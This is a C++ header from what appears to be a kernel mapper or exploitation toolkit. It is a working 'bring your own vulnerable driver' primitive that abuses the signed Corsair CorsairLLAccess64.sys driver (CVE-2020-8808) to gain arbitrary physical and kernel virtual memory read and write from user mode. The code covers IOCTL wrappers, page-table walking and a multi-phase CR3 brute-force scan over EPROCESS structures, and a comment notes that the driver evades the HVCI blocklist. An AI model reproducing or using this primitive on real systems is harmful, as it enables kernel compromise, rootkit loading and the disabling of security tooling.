#pragma once
// primitive_corsair.hpp
// Corsair CorsairLLAccess64.sys BYOVD primitive (Corsair Memory, Inc.)
// Signing: Microsoft Windows Hardware Compatibility Publisher (WHQL)
// Device: \\.\CorsairLLAccess (service name from SCM loader)
// IOCTLs:
//   0x225374 MAP_IO_SPACE   — MmMapIoSpace, maps full pages to usermode
//   0x229378 UNMAP_IO_SPACE — unmap previously mapped region
//   0x225388 READ_MSR       — __readmsr
//   0x229384 WRITE_MSR      — __writemsr
// Advantage: full-page mapping (memcpy) vs TRIXX 8-byte-per-IOCTL
// CVE-2020-8808 (iCUE < 3.25.60), NOT on MS HVCI blocklist

#include "mapper.hpp"
#include <Windows.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <memory>
#include <algorithm>
#include <iostream>
#include <vector>

#ifdef min
#undef min
#endif

static constexpr DWORD CORSAIR_IOCTL_MAP_IO_SPACE   = 0x225374;
static constexpr DWORD CORSAIR_IOCTL_UNMAP_IO_SPACE = 0x229378;
static constexpr DWORD CORSAIR_IOCTL_READ_MSR       = 0x225388;
static constexpr DWORD CORSAIR_IOCTL_WRITE_MSR      = 0x229384;

#pragma pack(push, 1)
struct CORSAIR_MAP_PARAMS {
    LARGE_INTEGER Base;   // +0x00: physical address
    ULONG         Size;   // +0x08: bytes to map
};

struct CORSAIR_MSR_WRITE {
    ULONG     MsrIndex;   // +0x00
    ULONG_PTR Value;      // +0x04 (8 bytes on x64)
};
#pragma pack(pop)

// Map a physical page into usermode VA. Returns mapped pointer or nullptr.
static void* CorsairMapPhys(HANDLE h, uint64_t pa, uint32_t size) {
    CORSAIR_MAP_PARAMS params = {};
    params.Base.QuadPart = (LONGLONG)pa;
    params.Size = size;
    PVOID mapped = nullptr;
    DWORD got = 0;
    if (!DeviceIoControl(h, CORSAIR_IOCTL_MAP_IO_SPACE,
                         &params, sizeof(params),
                         &mapped, sizeof(PVOID), &got, nullptr))
        return nullptr;
    return mapped;
}

// Unmap a previously mapped region
static void CorsairUnmapPhys(HANDLE h, void* mapped) {
    if (!mapped) return;
    DWORD got = 0;
    DeviceIoControl(h, CORSAIR_IOCTL_UNMAP_IO_SPACE,
                    &mapped, sizeof(PVOID),
                    nullptr, 0, &got, nullptr);
}

// SEH-safe memcpy wrappers (no C++ objects — MSVC requires this separation)
static int CorsairSehMemcpyRead(void* dst, const void* src, size_t n) {
    __try { memcpy(dst, src, n); return 1; }
    __except(EXCEPTION_EXECUTE_HANDLER) { return 0; }
}
static int CorsairSehMemcpyWrite(void* dst, const void* src, size_t n) {
    __try { memcpy(dst, src, n); return 1; }
    __except(EXCEPTION_EXECUTE_HANDLER) { return 0; }
}

static bool CorsairPhysRead(HANDLE h, uint64_t pa, void* dst, size_t size) {
    uint8_t* d = (uint8_t*)dst;
    size_t off = 0;
    while (off < size) {
        uint64_t pageBase = (pa + off) & ~0xFFFULL;
        uint32_t pageOff  = (uint32_t)((pa + off) & 0xFFF);
        uint32_t chunk    = (uint32_t)std::min(size - off, (size_t)(0x1000 - pageOff));

        void* mapped = CorsairMapPhys(h, pageBase, 0x1000);
        if (!mapped) return false;

        int ok = CorsairSehMemcpyRead(d + off, (uint8_t*)mapped + pageOff, chunk);
        CorsairUnmapPhys(h, mapped);
        if (!ok) return false;
        off += chunk;
    }
    return true;
}

static bool CorsairPhysWrite(HANDLE h, uint64_t pa, const void* src, size_t size) {
    const uint8_t* s = (const uint8_t*)src;
    size_t off = 0;
    while (off < size) {
        uint64_t pageBase = (pa + off) & ~0xFFFULL;
        uint32_t pageOff  = (uint32_t)((pa + off) & 0xFFF);
        uint32_t chunk    = (uint32_t)std::min(size - off, (size_t)(0x1000 - pageOff));

        void* mapped = CorsairMapPhys(h, pageBase, 0x1000);
        if (!mapped) return false;

        int ok = CorsairSehMemcpyWrite((uint8_t*)mapped + pageOff, s + off, chunk);
        CorsairUnmapPhys(h, mapped);
        if (!ok) return false;
        off += chunk;
    }
    return true;
}

// Fast 8-byte read without unmap overhead tracking
static uint64_t CorsairRead8(HANDLE h, uint64_t pa) {
    uint64_t v = 0;
    CorsairPhysRead(h, pa, &v, 8);
    return v;
}

// ── 4-level page table walk ──────────────────────────────────────
// Masks shared with primitive_trixx.hpp — use those if already defined

static uint64_t CorsairVirtToPhys(HANDLE h, uint64_t cr3, uint64_t va) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };

    uint64_t pml4e = CorsairRead8(h, (cr3 & PTE_ADDR_MASK) + idx(39) * 8);
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte = CorsairRead8(h, (pml4e & PTE_ADDR_MASK) + idx(30) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);

    uint64_t pde = CorsairRead8(h, (pdpte & PTE_ADDR_MASK) + idx(21) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);

    uint64_t pte = CorsairRead8(h, (pde & PTE_ADDR_MASK) + idx(12) * 8);
    if (!(pte & 1)) return 0;
    return (pte & PTE_ADDR_MASK) | (va & 0xFFF);
}

// ── Safe physical RAM range query ────────────────────────────────
struct CorsairPhysRange { uint64_t lo, hi; };

static bool CorsairIsInSafeRange(uint64_t addr, const std::vector<CorsairPhysRange>& ranges) {
    for (auto& r : ranges)
        if (addr >= r.lo && addr < r.hi) return true;
    return false;
}

static std::vector<CorsairPhysRange> CorsairGetSafePhysRanges() {
    std::vector<CorsairPhysRange> ranges;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return ranges;

    DWORD dataSize = 0, type = 0;
    RegQueryValueExA(hKey, ".Translated", NULL, &type, NULL, &dataSize);
    auto data = std::make_unique<BYTE[]>(dataSize);
    if (RegQueryValueExA(hKey, ".Translated", NULL, &type, data.get(), &dataSize)
            != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return ranges;
    }
    RegCloseKey(hKey);

    if (dataSize < 20) return ranges;
    auto* p = data.get();
    ULONG listCount = *(ULONG*)p; p += 4;

    for (ULONG i = 0; i < listCount && p < data.get() + dataSize; i++) {
        p += 8;
        p += 4;
        ULONG descCount = *(ULONG*)p; p += 4;

        for (ULONG j = 0; j < descCount && p + 20 <= data.get() + dataSize; j++) {
            UCHAR resType = p[0];
            USHORT flags  = *(USHORT*)(p + 2);
            uint64_t start = *(uint64_t*)(p + 4);
            uint64_t length = *(uint32_t*)(p + 12);
            p += 20;

            if (resType == 3) {
                if (length > 0)
                    ranges.push_back({ start, start + length });
            } else if (resType == 7) {
                if (flags & 0x0200)      length <<= 8;
                else if (flags & 0x0400) length <<= 16;
                else if (flags & 0x0800) length <<= 32;
                if (length > 0)
                    ranges.push_back({ start, start + length });
            }
        }
    }
    return ranges;
}

static uint64_t CorsairVirtToPhysSafe(HANDLE h, uint64_t cr3,
        uint64_t va, const std::vector<CorsairPhysRange>& ranges) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };

    uint64_t a0 = (cr3 & PTE_ADDR_MASK) + idx(39) * 8;
    if (!CorsairIsInSafeRange(a0, ranges)) return 0;
    uint64_t pml4e = CorsairRead8(h, a0);
    if (!(pml4e & 1)) return 0;

    uint64_t a1 = (pml4e & PTE_ADDR_MASK) + idx(30) * 8;
    if (!CorsairIsInSafeRange(a1, ranges)) return 0;
    uint64_t pdpte = CorsairRead8(h, a1);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);

    uint64_t a2 = (pdpte & PTE_ADDR_MASK) + idx(21) * 8;
    if (!CorsairIsInSafeRange(a2, ranges)) return 0;
    uint64_t pde = CorsairRead8(h, a2);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);

    uint64_t a3 = (pde & PTE_ADDR_MASK) + idx(12) * 8;
    if (!CorsairIsInSafeRange(a3, ranges)) return 0;
    uint64_t pte = CorsairRead8(h, a3);
    if (!(pte & 1)) return 0;
    return (pte & PTE_ADDR_MASK) | (va & 0xFFF);
}

// ── CR3 bootstrap ───────────────────────────────────────────────
// Corsair maps pages with MmMapIoSpace default caching — may need
// the same MmCached IAT patch as TRIXX if UC mapping fails for PTEs.
// However, Corsair uses MmMapLockedPagesSpecifyCache(UserMode) which
// maps into user VA — the caching is set by MmProbeAndLockPages, not
// MmMapIoSpace directly. This typically works without patching.
static uint64_t CorsairBootstrapCR3(HANDLE h) {
    printf("[*] CorsairBootstrapCR3 starting (full-page mapping)\n");

    typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
    auto NtQSI = (pNtQuerySystemInformation)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) { printf("[-] NtQSI not found\n"); return 0; }

    ULONG needed = 0;
    NtQSI(11, nullptr, 0, &needed);
    auto buf = std::make_unique<uint8_t[]>(needed);
    if (NtQSI(11, buf.get(), needed, &needed) != 0) {
        printf("[-] NtQSI(11) failed\n"); return 0;
    }

    struct RTL_PROCESS_MODULE_INFORMATION {
        PVOID Section; PVOID MappedBase; PVOID ImageBase;
        ULONG ImageSize; ULONG Flags;
        USHORT LoadOrderIndex; USHORT InitOrderIndex;
        USHORT LoadCount; USHORT OffsetToFileName;
        CHAR FullPathName[256];
    };
    ULONG moduleCount = *(ULONG*)buf.get();
    if (!moduleCount) { printf("[-] No modules\n"); return 0; }
    auto* mod0 = (RTL_PROCESS_MODULE_INFORMATION*)(buf.get() + 8);
    uint64_t ntkrnlVA = (uint64_t)mod0->ImageBase;
    int ntkrnlPml4Idx = (int)((ntkrnlVA >> 39) & 0x1FF);
    printf("[*] ntoskrnl: VA=0x%llx PML4[%d]\n",
           (unsigned long long)ntkrnlVA, ntkrnlPml4Idx);

    auto ranges = CorsairGetSafePhysRanges();
    if (ranges.empty()) { printf("[-] No phys ranges\n"); return 0; }
    printf("[*] %zu RAM ranges:\n", ranges.size());
    for (size_t i = 0; i < ranges.size(); i++)
        printf("[*]   %zu: 0x%llx-0x%llx (%llu MB)\n", i,
             (unsigned long long)ranges[i].lo, (unsigned long long)ranges[i].hi,
             (unsigned long long)((ranges[i].hi - ranges[i].lo) >> 20));

    uint64_t maxPhys = ranges.back().hi + 0x10000000ULL;

    // NtBuildNumber VA for verification
    uint64_t nbVA = 0;
    {
        HMODULE hNb = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (hNb) {
            auto* pNB = (uint8_t*)GetProcAddress(hNb, "NtBuildNumber");
            if (pNB) nbVA = ntkrnlVA + (uint64_t)(pNB - (uint8_t*)hNb);
            FreeLibrary(hNb);
        }
    }

    auto countPML4 = [&](uint64_t c) -> int {
        int count = 0;
        for (int i = 256; i < 512; i++) {
            uint64_t e = CorsairRead8(h, (c & PTE_ADDR_MASK) + i * 8);
            if (e & 1) count++;
        }
        return count;
    };

    const uint32_t EP_DTB  = 0x028;
    const uint32_t EP_PID  = 0x440;
    const uint32_t EP_NAME = 0x5A8;

    auto validateCR3 = [&](uint64_t candidate) -> bool {
        uint64_t pa = CorsairVirtToPhysSafe(h, candidate, ntkrnlVA, ranges);
        if (!pa || !CorsairIsInSafeRange(pa, ranges)) return false;
        uint16_t mz = 0;
        CorsairPhysRead(h, pa, &mz, 2);
        if (mz != 0x5A4D) return false;
        if (nbVA) {
            uint64_t nbPA = CorsairVirtToPhysSafe(h, candidate, nbVA, ranges);
            if (nbPA && CorsairIsInSafeRange(nbPA, ranges)) {
                uint32_t nbVal = 0;
                CorsairPhysRead(h, nbPA, &nbVal, 4);
                uint32_t bc = nbVal & 0xFFFF;
                if (bc < 7600 || bc > 30000) return false;
            }
        }
        return true;
    };

    uint64_t cr3 = 0;

    // Phase 1: EPROCESS scan
    printf("[*] Phase1: EPROCESS scan\n");
    struct EPMatch { uint64_t epPA, pid, dtb; char name[16]; };
    std::vector<EPMatch> epMatches;

    for (size_t r = 0; r < ranges.size(); r++) {
        uint64_t lo = (ranges[r].lo + 0xFFF) & ~0xFFFULL;
        uint64_t hi = ranges[r].hi & ~0xFFFULL;
        if (lo >= hi) continue;

        for (uint64_t pa = lo; pa < hi; pa += 0x1000) {
            if ((pa & 0x3FFFFFF) == 0)
                printf("[*]   Phase1: 0x%llx\n", (unsigned long long)pa);

            // Bulk read entire page into local buffer (SEH-safe), then scan
            uint8_t pageBuf[0x1000];
            if (!CorsairPhysRead(h, pa, pageBuf, 0x1000)) continue;

            for (uint16_t off = 0x440; off <= 0xA00; off += 0x10) {
                uint64_t pid = *(uint64_t*)(pageBuf + off);
                if (pid < 1 || pid > 65536) continue;

                uint32_t epOff = off - EP_PID;
                uint8_t type = pageBuf[epOff];
                if (type != 3) continue;

                uint64_t flink = *(uint64_t*)(pageBuf + epOff + 0x448);
                if ((flink >> 47) != 0x1FFFF) continue;

                char* nm = (char*)(pageBuf + epOff + EP_NAME);
                bool nameOk = false;
                for (int i = 0; i < 15; i++) {
                    if (nm[i] == 0) { nameOk = (i >= 2); break; }
                    if (nm[i] < 0x20 || nm[i] > 0x7E) break;
                }
                if (!nameOk) continue;

                uint64_t dtbRaw = *(uint64_t*)(pageBuf + epOff + EP_DTB);
                uint64_t dtb = dtbRaw & ~0xFFFULL;
                if (!dtb || (dtbRaw >> 52) || !CorsairIsInSafeRange(dtb, ranges)) continue;

                EPMatch m = {};
                m.epPA = pa + epOff;
                m.pid = pid;
                m.dtb = dtb;
                memcpy(m.name, nm, 15);
                epMatches.push_back(m);

                printf("[+] Phase1: %.15s PID=%llu DTB=0x%llx\n",
                       m.name, (unsigned long long)pid, (unsigned long long)dtb);
            }
        }
    }
    printf("[*] Phase1: %zu EPROCESS matches\n", epMatches.size());

    std::sort(epMatches.begin(), epMatches.end(), [](const EPMatch& a, const EPMatch& b) {
        if (a.pid == 4 && b.pid != 4) return true;
        if (a.pid != 4 && b.pid == 4) return false;
        return a.pid < b.pid;
    });

    // Phase 2: DTB walk with KPTI companions
    if (!cr3 && !epMatches.empty()) {
        printf("[*] Phase2: validating %zu DTBs\n", epMatches.size());
        for (auto& m : epMatches) {
            for (int d = -8; d <= 8; d++) {
                uint64_t tryDTB = m.dtb + (int64_t)d * 0x1000;
                if (!tryDTB || !CorsairIsInSafeRange(tryDTB, ranges)) continue;
                if (validateCR3(tryDTB)) {
                    int pml4 = countPML4(tryDTB);
                    printf("[+] Phase2: CR3=0x%llx (d=%+d from %.15s PID=%llu) PML4=%d\n",
                           (unsigned long long)tryDTB, d, m.name,
                           (unsigned long long)m.pid, pml4);
                    cr3 = tryDTB;
                    break;
                }
            }
            if (cr3) break;
        }
    }

    // Phase 3: Self-referencing PTE scan
    if (!cr3) {
        printf("[*] Phase3: self-referencing PTE scan\n");
        for (size_t r = 0; r < ranges.size() && !cr3; r++) {
            uint64_t lo = (ranges[r].lo + 0xFFF) & ~0xFFFULL;
            uint64_t hi = ranges[r].hi & ~0xFFFULL;
            for (uint64_t pa = lo; pa < hi && !cr3; pa += 0x1000) {
                if ((pa & 0x3FFFFFF) == 0)
                    printf("[*]   Phase3: 0x%llx\n", (unsigned long long)pa);

                uint64_t ntkE = CorsairRead8(h, pa + ntkrnlPml4Idx * 8);
                if (!(ntkE & 1)) continue;
                uint64_t target = ntkE & PTE_ADDR_MASK;
                if (!target || target >= maxPhys) continue;

                for (int idx = 256; idx < 512; idx++) {
                    uint64_t e = CorsairRead8(h, pa + idx * 8);
                    if (!(e & 1)) continue;
                    if ((e & PTE_ADDR_MASK) != pa) continue;
                    if (validateCR3(pa)) {
                        printf("[+] Phase3: self-ref CR3=0x%llx idx=%d\n",
                               (unsigned long long)pa, idx);
                        cr3 = pa;
                    }
                    break;
                }
            }
        }
    }

    // Phase 4: Brute-force PML4 scan
    if (!cr3) {
        printf("[*] Phase4: brute-force PML4 scan\n");
        for (size_t r = 0; r < ranges.size() && !cr3; r++) {
            uint64_t lo = (ranges[r].lo + 0xFFF) & ~0xFFFULL;
            uint64_t hi = ranges[r].hi & ~0xFFFULL;
            for (uint64_t pa = lo; pa < hi && !cr3; pa += 0x1000) {
                if ((pa & 0xFFFFFFF) == 0)
                    printf("[*]   Phase4: 0x%llx\n", (unsigned long long)pa);

                uint64_t ntkE = CorsairRead8(h, pa + ntkrnlPml4Idx * 8);
                if (!(ntkE & 1)) continue;
                uint64_t ksdE = CorsairRead8(h, pa + 495 * 8);
                if (!(ksdE & 1)) continue;

                if (validateCR3(pa)) {
                    printf("[+] Phase4: CR3=0x%llx\n", (unsigned long long)pa);
                    cr3 = pa;
                }
            }
        }
    }

    // KPTI upgrade
    if (cr3) {
        int myCount = countPML4(cr3);
        if (myCount < 200) {
            for (int d = -8; d <= 8; d++) {
                if (d == 0) continue;
                uint64_t alt = cr3 + (int64_t)d * 0x1000;
                if (!CorsairIsInSafeRange(alt, ranges)) continue;
                int altCount = countPML4(alt);
                if (altCount > myCount && altCount >= 200 && validateCR3(alt)) {
                    printf("[+] KPTI upgrade: 0x%llx (%d) -> 0x%llx (%d)\n",
                           (unsigned long long)cr3, myCount,
                           (unsigned long long)alt, altCount);
                    cr3 = alt;
                    break;
                }
            }
        }
    }

    printf("[+] CR3 at phys 0x%llx\n", (unsigned long long)cr3);
    return cr3;
}

// ── Virtual R/W using full-page mapping ─────────────────────────
// Maps entire page, memcpy the chunk, unmap. Much faster than
// TRIXX's per-8-byte IOCTL approach.
static bool CorsairVirtRead(HANDLE h, uint64_t cr3, uint64_t va, void* dst, size_t n) {
    uint8_t* d = (uint8_t*)dst;
    while (n) {
        uint64_t pa = CorsairVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);

        void* mapped = CorsairMapPhys(h, pa & ~0xFFFULL, 0x1000);
        if (!mapped) return false;

        int ok = CorsairSehMemcpyRead(d, (uint8_t*)mapped + (pa & 0xFFF), chunk);
        CorsairUnmapPhys(h, mapped);
        if (!ok) return false;
        va += chunk; d += chunk; n -= chunk;
    }
    return true;
}

static bool CorsairVirtWrite(HANDLE h, uint64_t cr3, uint64_t va, const void* src, size_t n) {
    const uint8_t* s = (const uint8_t*)src;
    while (n) {
        uint64_t pa = CorsairVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);

        void* mapped = CorsairMapPhys(h, pa & ~0xFFFULL, 0x1000);
        if (!mapped) return false;

        int ok = CorsairSehMemcpyWrite((uint8_t*)mapped + (pa & 0xFFF), s, chunk);
        CorsairUnmapPhys(h, mapped);
        if (!ok) return false;
        va += chunk; s += chunk; n -= chunk;
    }
    return true;
}

// ── Session + KernelPrimitives factory ───────────────────────────
struct CorsairSession {
    HANDLE dev = INVALID_HANDLE_VALUE;
    uint64_t cr3 = 0;
};

inline KernelPrimitives OpenCorsair(std::string& err)
{
    HANDLE h = INVALID_HANDLE_VALUE;
    for (int retry = 0; retry < 5; ++retry) {
        h = CreateFileW(L"\\\\.\\CorsairLLAccess",
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) break;
        if (retry < 4) Sleep(500);
    }
    if (h == INVALID_HANDLE_VALUE) {
        err = "OpenCorsair: CreateFile failed err=" + std::to_string(GetLastError()) +
              " (CorsairLLAccess service loaded?)";
        return {};
    }

    // Smoke test: map page 0x1000
    void* smoke = CorsairMapPhys(h, 0x1000, 0x1000);
    if (!smoke) {
        CloseHandle(h);
        err = "OpenCorsair: smoke test map failed (IOCTL rejected)";
        return {};
    }
    CorsairUnmapPhys(h, smoke);

    uint64_t cr3 = CorsairBootstrapCR3(h);
    if (!cr3) {
        CloseHandle(h);
        err = "OpenCorsair: CR3 bootstrap failed";
        return {};
    }

    printf("[+] Corsair opened, CR3=0x%llx\n", (unsigned long long)cr3);

    auto sp = std::make_shared<CorsairSession>();
    sp->dev = h;
    sp->cr3 = cr3;

    KernelPrimitives p;

    p.ReadKernelMemory = [sp](void* dst, uint64_t src, size_t sz) -> bool {
        return CorsairVirtRead(sp->dev, sp->cr3, src, dst, sz);
    };

    p.WriteKernelMemory = [sp](uint64_t dst, const void* src, size_t sz) -> bool {
        return CorsairVirtWrite(sp->dev, sp->cr3, dst, src, sz);
    };

    p.AllocateKernelMemory = nullptr;

    p.ReadPhysicalMemory = [sp](void* dst, uint64_t pa, size_t sz) -> bool {
        return CorsairPhysRead(sp->dev, pa, dst, (uint32_t)sz);
    };
    p.cr3 = cr3;
    p.UpdateCR3 = [sp](uint64_t newCr3) { sp->cr3 = newCr3; };

    return p;
}
